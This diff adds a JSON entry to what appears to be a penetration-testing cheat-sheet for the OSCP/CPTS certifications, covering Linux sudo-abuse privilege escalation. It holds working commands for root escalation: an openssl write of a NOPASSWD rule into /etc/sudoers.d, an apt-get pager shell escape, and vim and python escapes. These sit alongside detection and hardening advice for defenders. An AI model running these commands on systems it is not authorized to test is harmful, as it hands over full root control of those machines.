@@ -1,0 +1,94 @@
+{
+  "type": "command",
+  "platform": "linux",
+  "requires": [
+    "local-access"
+  ],
+  "protocols": [],
+  "tools": [
+    "sudo"
+  ],
+  "tags": [
+    "sudo",
+    "gtfobins"
+  ],
+  "category": "Privilege Escalation",
+  "subcategory": "Linux - Sudo Abuse",
+  "certifications": [
+    "CPTS",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 25: Linux Privilege Escalation",
+  "examples": [
+    {
+      "label": "Enumerate what you can run as sudo",
+      "command": "sudo -l"
+    },
+    {
+      "label": "GTFOBins-style openssl write to /etc/sudoers.d",
+      "command": "echo \"htb-student ALL=(ALL) NOPASSWD:ALL\" | base64 | sudo /usr/bin/openssl enc -d -a -out /etc/sudoers.d/htb-student"
+    },
+    {
+      "label": "OSCP Ch17 \u2014 apt-get GTFOBins escape: changelog spawns less, then shell",
+      "command": "sudo apt-get changelog apt\n# In the pager, type:\n!/bin/sh"
+    }
+  ],
+  "notes": "sudo -l is the first thing to run on any box. A single NOPASSWD binary is usually enough - check it on GTFOBins. The openssl trick writes a NOPASSWD line into /etc/sudoers.d when openssl is sudo-allowed. OSCP Ch17: apt-get changelog opens less; type !/bin/sh inside less to escape to root shell. Always check GTFOBins for every binary in 'sudo -l'. AppArmor may block tcpdump sudo escape even when it's listed \u2014 check /var/log/syslog for apparmor=DENIED. Also covered in: OSCP PEN-200 Chapter 17 (Linux Privilege Escalation).",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/"
+    },
+    {
+      "title": "HTB Academy - Linux Privilege Escalation",
+      "url": "https://academy.hackthebox.com/module/details/51"
+    },
+    {
+      "title": "OffSec PEN-200 - Linux Privilege Escalation",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "sudo-tcpdump",
+      "note": "tcpdump postrotate is a classic sudo escape.",
+      "rel": "next"
+    },
+    {
+      "id": "ld-preload",
+      "note": "If env_keep+=LD_PRELOAD is set, preload a .so.",
+      "rel": "next"
+    },
+    {
+      "id": "sudo-cve-2021-3156",
+      "note": "No useful entry? Try the Baron Samedit CVE.",
+      "rel": "alternative"
+    }
+  ],
+  "id": "sudo-abuse",
+  "name": "Sudo Abuse - Enumerate and Exploit",
+  "command": "sudo -l",
+  "description": "List what you may run via sudo, then check GTFOBins for each entry. Many allowed binaries (tcpdump, openssl, vim, less, etc.) can be turned into a root shell or arbitrary file write.",
+  "opsec": "loud",
+  "mitre": [
+    "T1548.003"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "Many sudo entries allow running specific commands as root. GTFOBins documents how legitimate binaries (vim, find, less, python, awk, nmap, etc.) can be used to spawn shells when run with sudo. Even seemingly restricted sudo entries can be abused if the allowed binary has shell escape or command execution capabilities.",
+    "prerequisites": "Any sudo privilege (even for a single command). The allowed command has a GTFOBins-listed shell escape or command execution vector.",
+    "impact": "Root shell via sudo-privileged binary abuse. Enables full system compromise from a single misconfigured sudo entry.",
+    "detection": "Unusual use of sudo-allowed commands to spawn shell processes (sudo vim \u2192 :!bash). Auditd: bash/sh spawned as child of sudo-executed binary. SIEM: interactive shell spawned from normally batch-only processes.",
+    "artifacts": "Sudo log (/var/log/auth.log): sudo execution of allowed binary | Process tree: vim/find/python -> /bin/bash as root",
+    "prevention": "Review all sudo entries against GTFOBins. Avoid granting sudo access to any binary with shell escape capabilities unless absolutely necessary. Use 'NOEXEC' sudo flag to prevent command execution from within allowed binaries. Use strict sudo rules: specify exact command flags (e.g., /usr/bin/find /specific/path -type f) rather than unlimited arguments.",
+    "misconfiguration": "sudoers grants unrestricted access to binaries with GTFOBins shell escapes: 'htb-student ALL=(ALL) NOPASSWD: /usr/bin/vim' or 'ALL=(ALL) NOPASSWD: ALL'.",
+    "vulnerable_config": "# Overly permissive sudo rules\nhtb-student ALL=(ALL) NOPASSWD: /usr/bin/vim\nhtb-student ALL=(ALL) NOPASSWD: /usr/bin/python3\n\n# vim escape: sudo vim -c ':!/bin/bash'\n# python escape: sudo python3 -c 'import os; os.system(\"/bin/bash\")'",
+    "secure_config": "# Restrict sudo to only necessary operations\n# Use NOEXEC flag for editors\nhtb-student ALL=(ALL) NOEXEC: /usr/bin/vim /specific/config/file\n\n# Avoid granting sudo to: vim, python, perl, ruby, awk, find, less, man, etc.\n# Cross-reference all sudo entries against GTFOBins\n\n# Run sudo audit:\nsudo -l | grep -iE 'vim|python|perl|awk|find|less|nmap'",
+    "sources": [
+      "HTB M25",
+      "MITRE T1548.003",
+      "MITRE T1059"
+    ]
+  }
+}
